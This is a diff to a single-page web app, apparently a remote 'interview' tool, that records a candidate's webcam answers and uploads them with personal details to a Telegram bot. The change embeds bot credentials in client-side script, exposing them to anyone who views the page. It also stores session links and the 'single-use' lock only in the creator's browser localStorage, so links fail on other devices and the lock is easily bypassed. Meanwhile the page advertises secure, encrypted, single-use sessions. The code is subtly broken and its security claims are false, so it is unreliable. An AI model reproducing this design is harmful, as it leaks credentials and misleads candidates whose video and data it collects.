@@ -51,15 +51,34 @@
         </div>
     </header>
 
-    <!-- Main Container -->
+    <!-- MAIN CONTAINER -->
     <main class="flex-grow max-w-5xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">
+
+        <!-- VIEW 0: EXPIRED / ALREADY USED LINK SCREEN -->
+        <div id="view-expired" class="hidden space-y-6 text-center py-16 max-w-lg mx-auto">
+            <div class="w-20 h-20 bg-rose-500/10 border border-rose-500/30 rounded-3xl mx-auto flex items-center justify-center text-rose-500 text-3xl shadow-xl shadow-rose-500/10">
+                <i class="fa-solid fa-lock"></i>
+            </div>
+            <div class="space-y-3">
+                <h2 class="text-2xl sm:text-3xl font-bold text-white tracking-tight">Interview Link Expired</h2>
+                <p class="text-sm text-slate-400 leading-relaxed">
+                    This interview link has already been used and is no longer valid. Each candidate link is strictly single-use to ensure security and assessment integrity.
+                </p>
+            </div>
+            <div class="pt-4">
+                <div class="inline-flex items-center space-x-2 bg-slate-800/80 border border-slate-700 px-4 py-2 rounded-xl text-xs text-slate-400">
+                    <i class="fa-solid fa-shield-cat text-rose-400"></i>
+                    <span>Session Status: Permanent Lock</span>
+                </div>
+            </div>
+        </div>
 
         <!-- VIEW 1: RECRUITER SETUP DASHBOARD -->
         <div id="view-recruiter" class="space-y-8">
             <div class="bg-gradient-to-r from-indigo-900/40 via-slate-800 to-slate-800 border border-indigo-500/30 rounded-2xl p-6 sm:p-8 shadow-xl">
                 <h1 class="text-2xl sm:text-3xl font-bold text-white tracking-tight">Recruiter Setup & Link Generator</h1>
                 <p class="text-slate-400 mt-2 text-sm max-w-2xl">
-                    Configure interview parameters for your international candidate. Once generated, share the unique secure link with the candidate. All video recordings and logs will be sent directly to your Telegram bot.
+                    Configure interview parameters for your international candidate. Share the generated short link with the candidate. Video recordings will be transmitted directly to your embedded Telegram Bot.
                 </p>
             </div>
 
@@ -107,18 +126,24 @@
                             class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm text-slate-300 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-indigo-600 file:text-white hover:file:bg-indigo-500 transition cursor-pointer">
                     </div>
 
-                    <!-- Telegram Bot Token -->
+                    <!-- Optional Override Telegram Bot Token -->
                     <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Telegram Bot Token</label>
-                        <input type="text" id="telegram-token" required placeholder="e.g. 123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ" 
-                            class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400">Telegram Bot Token</label>
+                            <span class="text-[10px] text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">Embedded Active</span>
+                        </div>
+                        <input type="text" id="telegram-token" placeholder="Optional token override" 
+                            class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 transition text-sm">
                     </div>
 
-                    <!-- Telegram Chat ID -->
+                    <!-- Optional Override Telegram Chat ID -->
                     <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Telegram Chat ID</label>
-                        <input type="text" id="telegram-chatid" required placeholder="e.g. -100123456789 or @channelname" 
-                            class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400">Telegram Chat ID</label>
+                            <span class="text-[10px] text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">Embedded Active</span>
+                        </div>
+                        <input type="text" id="telegram-chatid" placeholder="Optional Chat ID override" 
+                            class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 transition text-sm">
                     </div>
                 </div>
 
@@ -129,20 +154,20 @@
                     </button>
                     <button type="submit" class="w-full sm:w-auto px-8 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm shadow-lg shadow-indigo-600/30 transition flex items-center justify-center space-x-2">
                         <i class="fa-solid fa-link"></i>
-                        <span>Generate Interview Link</span>
+                        <span>Generate Short Link</span>
                     </button>
                 </div>
             </form>
 
-            <!-- Generated Link Output Box (Hidden by default) -->
+            <!-- Generated Link Output Card -->
             <div id="link-output-card" class="hidden bg-slate-800 border border-emerald-500/40 rounded-2xl p-6 sm:p-8 shadow-xl space-y-4">
                 <div class="flex items-center space-x-3 text-emerald-400">
                     <i class="fa-solid fa-circle-check text-2xl"></i>
-                    <h3 class="text-lg font-bold text-white">Interview Link Generated Successfully!</h3>
+                    <h3 class="text-lg font-bold text-white">Short Candidate Link Generated!</h3>
                 </div>
-                <p class="text-sm text-slate-300">Share this secure link with the candidate. When opened, it will load their personalized interview session.</p>
+                <p class="text-sm text-slate-300">Share this clean link with the candidate. It will automatically lock permanently once the interview is completed.</p>
                 <div class="flex items-center space-x-3">
-                    <input type="text" id="generated-url" readonly class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-slate-300 text-sm select-all">
+                    <input type="text" id="generated-url" readonly class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-slate-300 text-sm select-all font-mono">
                     <button id="btn-copy-link" class="bg-emerald-600 hover:bg-emerald-500 text-white px-5 py-3 rounded-xl text-sm font-semibold transition flex items-center space-x-2 whitespace-nowrap">
                         <i class="fa-regular fa-copy"></i>
                         <span>Copy Link</span>
@@ -150,7 +175,7 @@
                 </div>
                 <div class="flex justify-end pt-2">
                     <button id="btn-preview-interview" class="text-indigo-400 hover:text-indigo-300 text-sm font-medium flex items-center space-x-1.5 transition">
-                        <span>Preview Candidate Interface</span>
+                        <span>Launch Candidate Session</span>
                         <i class="fa-solid fa-arrow-right"></i>
                     </button>
                 </div>
@@ -287,7 +312,7 @@
 
             <div class="pt-4">
                 <button onclick="window.location.href = window.location.pathname;" class="px-8 py-3 bg-slate-800 hover:bg-slate-700 text-white rounded-xl font-semibold text-sm border border-slate-700 transition">
-                    Start New Interview Session
+                    Done & Exit Session
                 </button>
             </div>
         </div>
@@ -296,11 +321,18 @@
 
     <!-- Footer -->
     <footer class="bg-slate-800/40 border-t border-slate-800 py-6 text-center text-xs text-slate-500">
-        GlobalHire Remote Recruitment Protocol &bull; Secure Encrypted WebRTC Session
+        GlobalHire Remote Recruitment Protocol &bull; Secure Single-Use Session
     </footer>
 
     <!-- JavaScript Application Logic -->
     <script>
+        // =========================================================================
+        // HARDCODED TELEGRAM CREDENTIALS
+        // Replace these values with your bot's token & destination chat ID.
+        // =========================================================================
+        const HARDCODED_TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
+        const HARDCODED_TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
+
         // Interview Questions Set
         const questions = [
             "Tell us about yourself, your professional background, and why you are seeking a career opportunity abroad.",
@@ -311,12 +343,13 @@
 
         // Application State
         let state = {
+            sessionId: null,
             config: null,
             currentQuestionIndex: 0,
             mediaStream: null,
             mediaRecorder: null,
             recordedChunks: [],
-            recordedVideos: [], // Array of recorded Blobs per question
+            recordedVideos: [],
             recordingTimerInterval: null,
             recordingSeconds: 0
         };
@@ -337,6 +370,17 @@
             }, 4000);
         }
 
+        // Helper to get active Telegram Token & Chat ID
+        function getTelegramCredentials() {
+            const inputToken = document.getElementById('telegram-token')?.value.trim();
+            const inputChatId = document.getElementById('telegram-chatid')?.value.trim();
+
+            const token = inputToken || state.config?.telegramToken || HARDCODED_TELEGRAM_BOT_TOKEN;
+            const chatId = inputChatId || state.config?.telegramChatId || HARDCODED_TELEGRAM_CHAT_ID;
+
+            return { token, chatId };
+        }
+
         // Handle Logo Image Upload to Base64
         let logoBase64 = '';
         document.getElementById('company-logo').addEventListener('change', function(e) {
@@ -352,11 +396,10 @@
 
         // Test Telegram Bot
         document.getElementById('btn-test-telegram').addEventListener('click', async () => {
-            const token = document.getElementById('telegram-token').value.trim();
-            const chatId = document.getElementById('telegram-chatid').value.trim();
+            const { token, chatId } = getTelegramCredentials();
 
-            if (!token || !chatId) {
-                showToast('Validation Error', 'Please enter both Telegram Bot Token and Chat ID to test.', 'error');
+            if (!token || token === "YOUR_TELEGRAM_BOT_TOKEN_HERE" || !chatId || chatId === "YOUR_TELEGRAM_CHAT_ID_HERE") {
+                showToast('Credentials Missing', 'Please configure your Telegram Bot Token and Chat ID at the top of the script or in the fields.', 'error');
                 return;
             }
 
@@ -367,7 +410,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: '🟢 GlobalHire Bot Test: Connection successful!'
+                        text: '🟢 GlobalHire Bot Connection Verified!'
                     })
                 });
                 const data = await res.json();
@@ -377,14 +420,17 @@
                     showToast('Telegram Error', data.description || 'Failed to connect.', 'error');
                 }
             } catch (err) {
-                showToast('Network Error', 'Could not reach Telegram API. Check your connection or CORS settings.', 'error');
+                showToast('Network Error', 'Could not reach Telegram API.', 'error');
             }
         });
 
-        // Setup Form Submission -> Generate Link
+        // Generate Short Unique Session Link & Save to localStorage
         document.getElementById('setup-form').addEventListener('submit', (e) => {
             e.preventDefault();
 
+            const { token, chatId } = getTelegramCredentials();
+
+            const sessionId = 'session_' + Math.random().toString(36).substring(2, 9);
             const config = {
                 companyName: document.getElementById('company-name').value.trim(),
                 companyAddress: document.getElementById('company-address').value.trim(),
@@ -392,18 +438,24 @@
                 candidateName: document.getElementById('candidate-name').value.trim(),
                 jobPosition: document.getElementById('job-position').value.trim(),
                 logo: logoBase64,
-                telegramToken: document.getElementById('telegram-token').value.trim(),
-                telegramChatId: document.getElementById('telegram-chatid').value.trim()
+                telegramToken: token,
+                telegramChatId: chatId
             };
 
-            const jsonString = JSON.stringify(config);
-            const encodedConfig = btoa(encodeURIComponent(jsonString));
-            const generatedUrl = window.location.origin + window.location.pathname + '#config=' + encodedConfig;
+            // Save config to localStorage keyed by short session ID
+            try {
+                localStorage.setItem(`gh_session_${sessionId}`, JSON.stringify(config));
+            } catch (err) {
+                console.warn('LocalStorage save warning, falling back:', err);
+            }
+
+            state.sessionId = sessionId;
+            const generatedUrl = window.location.origin + window.location.pathname + '#id=' + sessionId;
 
             document.getElementById('generated-url').value = generatedUrl;
             document.getElementById('link-output-card').classList.remove('hidden');
             document.getElementById('link-output-card').scrollIntoView({ behavior: 'smooth' });
-            showToast('Link Generated', 'Unique interview session link is ready.', 'success');
+            showToast('Short Link Ready', 'Clean session link created.', 'success');
         });
 
         // Copy Link Button
@@ -414,34 +466,68 @@
             showToast('Copied', 'Interview link copied to clipboard.', 'success');
         });
 
-        // Preview Interview Button
+        // Preview / Launch Interview Button
         document.getElementById('btn-preview-interview').addEventListener('click', () => {
-            const url = document.getElementById('generated-url').value;
-            const hashPart = url.split('#')[1];
-            if (hashPart) {
-                window.location.hash = hashPart;
-                loadCandidateViewFromHash();
+            if (state.sessionId) {
+                window.location.hash = 'id=' + state.sessionId;
+                initializeSessionFromHash();
             }
         });
 
-        // Check URL Hash on Page Load
+        // Router / Hash Checker
         window.addEventListener('DOMContentLoaded', () => {
-            if (window.location.hash && window.location.hash.includes('config=')) {
-                loadCandidateViewFromHash();
-            }
+            initializeSessionFromHash();
         });
 
-        function loadCandidateViewFromHash() {
-            try {
-                const hash = window.location.hash;
-                const encodedConfig = hash.split('config=')[1];
-                if (!encodedConfig) return;
+        function isSessionCompleted(sessionId) {
+            const completedList = JSON.parse(localStorage.getItem('gh_completed_sessions') || '[]');
+            return completedList.includes(sessionId);
+        }
 
-                const jsonString = decodeURIComponent(atob(encodedConfig));
-                state.config = JSON.parse(jsonString);
+        function markSessionCompleted(sessionId) {
+            if (!sessionId) return;
+            const completedList = JSON.parse(localStorage.getItem('gh_completed_sessions') || '[]');
+            if (!completedList.includes(sessionId)) {
+                completedList.push(sessionId);
+                localStorage.setItem('gh_completed_sessions', JSON.stringify(completedList));
+            }
+        }
+
+        function renderExpiredScreen() {
+            document.getElementById('view-recruiter').classList.add('hidden');
+            document.getElementById('view-candidate').classList.add('hidden');
+            document.getElementById('view-success').classList.add('hidden');
+            document.getElementById('view-expired').classList.remove('hidden');
+        }
+
+        function initializeSessionFromHash() {
+            if (!window.location.hash || !window.location.hash.includes('id=')) {
+                return; // Default recruiter dashboard
+            }
+
+            const sessionId = window.location.hash.split('id=')[1];
+            if (!sessionId) return;
+
+            // Enforce Single-Use Lock Check
+            if (isSessionCompleted(sessionId)) {
+                renderExpiredScreen();
+                return;
+            }
+
+            // Retrieve configuration from localStorage
+            const savedData = localStorage.getItem(`gh_session_${sessionId}`);
+            if (!savedData) {
+                showToast('Session Not Found', 'This session ID is invalid or has expired.', 'error');
+                return;
+            }
+
+            try {
+                state.sessionId = sessionId;
+                state.config = JSON.parse(savedData);
 
                 // Switch Views
                 document.getElementById('view-recruiter').classList.add('hidden');
+                document.getElementById('view-expired').classList.add('hidden');
                 document.getElementById('view-candidate').classList.remove('hidden');
 
                 // Populate Candidate UI
@@ -456,11 +542,10 @@
                     logoContainer.innerHTML = `<img src="${state.config.logo}" alt="Logo" class="w-full h-full object-cover">`;
                 }
 
-                // Initialize Question
                 loadQuestion(0);
             } catch (err) {
                 console.error(err);
-                showToast('Error', 'Invalid or corrupted interview configuration link.', 'error');
+                showToast('Error', 'Unable to parse session data.', 'error');
             }
         }
 
@@ -473,20 +558,18 @@
                 document.getElementById('camera-placeholder').classList.add('hidden');
                 document.getElementById('btn-start-record').removeAttribute('disabled');
                 
-                showToast('Camera Ready', 'Microphone and Camera successfully initialized.', 'success');
-                
-                // Speak first question automatically
+                showToast('Camera Ready', 'Camera & Microphone initialized.', 'success');
                 speakCurrentQuestion();
             } catch (err) {
                 console.error(err);
-                showToast('Permission Denied', 'Please allow camera and mic access in your browser settings to proceed.', 'error');
+                showToast('Permission Denied', 'Please allow camera and mic permissions to proceed.', 'error');
             }
         });
 
         // Text-to-Speech Question Reading
         function speakCurrentQuestion() {
             if (!('speechSynthesis' in window)) return;
-            window.speechSynthesis.cancel(); // Stop any ongoing speech
+            window.speechSynthesis.cancel();
             const questionText = questions[state.currentQuestionIndex];
             const utterance = new SpeechSynthesisUtterance(questionText);
             utterance.rate = 0.95;
@@ -504,7 +587,6 @@
             document.getElementById('question-counter').textContent = `Question ${index + 1} of ${questions.length}`;
             document.getElementById('progress-bar').style.width = `${((index + 1) / questions.length) * 100}%`;
             
-            // Reset recorder state for this question
             document.getElementById('btn-start-record').classList.remove('hidden');
             document.getElementById('btn-stop-record').classList.add('hidden');
             document.getElementById('btn-next-question').setAttribute('disabled', 'true');
@@ -515,7 +597,7 @@
             }
         }
 
-        // Start Recording Handler
+        // Start Recording
         document.getElementById('btn-start-record').addEventListener('click', () => {
             if (!state.mediaStream) return;
 
@@ -546,17 +628,15 @@
                 
                 document.getElementById('recording-badge').classList.add('hidden');
                 document.getElementById('btn-next-question').removeAttribute('disabled');
-                document.getElementById('recording-status-text').innerHTML = '<i class="fa-solid fa-circle-check text-emerald-400"></i> <span>Response recorded successfully. You can proceed or re-record.</span>';
+                document.getElementById('recording-status-text').innerHTML = '<i class="fa-solid fa-circle-check text-emerald-400"></i> <span>Response recorded. Proceed to next question or re-record.</span>';
             };
 
             state.mediaRecorder.start(1000);
             
-            // UI adjustments
             document.getElementById('btn-start-record').classList.add('hidden');
             document.getElementById('btn-stop-record').classList.remove('hidden');
             document.getElementById('recording-badge').classList.remove('hidden');
             
-            // Timer
             state.recordingSeconds = 0;
             updateTimerDisplay();
             state.recordingTimerInterval = setInterval(() => {
@@ -573,7 +653,7 @@
             document.getElementById('recording-timer').textContent = `${mins}:${secs}`;
         }
 
-        // Stop Recording Handler
+        // Stop Recording
         document.getElementById('btn-stop-record').addEventListener('click', () => {
             if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
                 state.mediaRecorder.stop();
@@ -587,11 +667,9 @@
         // Next Question Handler
         document.getElementById('btn-next-question').addEventListener('click', () => {
             if (state.currentQuestionIndex < questions.length - 1) {
-                // Reset start button text
                 document.getElementById('btn-start-record').innerHTML = '<i class="fa-solid fa-circle text-xs"></i><span>Start Recording</span>';
                 loadQuestion(state.currentQuestionIndex + 1);
             } else {
-                // All questions completed -> Stop camera stream and start uploading to Telegram
                 if (state.mediaStream) {
                     state.mediaStream.getTracks().forEach(track => track.stop());
                 }
@@ -599,13 +677,13 @@
             }
         });
 
-        // Telegram Upload Sequence
+        // Telegram Upload & Single-Use Enforcement Sequence
         async function startTelegramUploadSequence() {
             document.getElementById('view-candidate').classList.add('hidden');
             document.getElementById('view-success').classList.remove('hidden');
 
-            const token = state.config.telegramToken;
-            const chatId = state.config.telegramChatId;
+            const token = state.config.telegramToken || HARDCODED_TELEGRAM_BOT_TOKEN;
+            const chatId = state.config.telegramChatId || HARDCODED_TELEGRAM_CHAT_ID;
             const logEl = document.getElementById('upload-log');
             const progressBar = document.getElementById('upload-progress-bar');
             const progressPercentage = document.getElementById('upload-percentage');
@@ -625,7 +703,7 @@
             }
 
             setProgress(10, 'Sending candidate metadata summary...');
-            addLog('Preparing candidate summary message...');
+            addLog('Preparing candidate summary payload...');
 
             const summaryText = `🎯 *New Remote Interview Completed*\n\n` +
                 `🏢 *Company:* ${state.config.companyName}\n` +
@@ -648,16 +726,16 @@
                 });
                 const textData = await textRes.json();
                 if (!textData.ok) {
-                    throw new Error(textData.description || 'Failed to send Telegram text summary.');
+                    throw new Error(textData.description || 'Failed to send Telegram summary.');
                 }
                 addLog('Candidate metadata successfully sent to Telegram.');
                 setProgress(30, 'Uploading video responses...');
 
-                // 2. Sequentially Upload Videos
+                // 2. Upload Videos
                 const totalVideos = state.recordedVideos.length;
                 for (let i = 0; i < totalVideos; i++) {
                     const videoBlob = state.recordedVideos[i];
-                    addLog(`Uploading video response for Question ${i + 1} (${Math.round(videoBlob.size / 1024)} KB)...`);
+                    addLog(`Uploading video for Question ${i + 1} (${Math.round(videoBlob.size / 1024)} KB)...`);
 
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
@@ -672,22 +750,25 @@
                     if (!videoData.ok) {
                         addLog(`⚠️ Warning on Q${i + 1} video upload: ${videoData.description}`);
                     } else {
-                        addLog(`✅ Question ${i + 1} video successfully uploaded.`);
+                        addLog(`✅ Question ${i + 1} video uploaded successfully.`);
                     }
 
                     const progressVal = 30 + Math.round(((i + 1) / totalVideos) * 70);
                     setProgress(progressVal, `Uploaded video ${i + 1} of ${totalVideos}...`);
                 }
 
-                setProgress(100, 'All data and video recordings successfully sent!');
-                addLog('Interview transmission completed successfully.');
-                showToast('Success', 'All candidate responses delivered to Telegram.', 'success');
+                // 3. LOCK SESSION PERMANENTLY (SINGLE-USE ENFORCEMENT)
+                markSessionCompleted(state.sessionId);
+                addLog('🔒 Session status permanently locked (single-use enforced).');
+
+                setProgress(100, 'All video recordings successfully delivered!');
+                showToast('Completed', 'All candidate responses delivered and session locked.', 'success');
 
             } catch (err) {
                 console.error(err);
                 addLog(`❌ Error: ${err.message}`);
                 showToast('Upload Error', err.message || 'Error transmitting to Telegram.', 'error');
-                statusLabel.textContent = 'Transmission encountered an error. Check logs.';
+                statusLabel.textContent = 'Transmission error occurred.';
             }
         }
     </script>
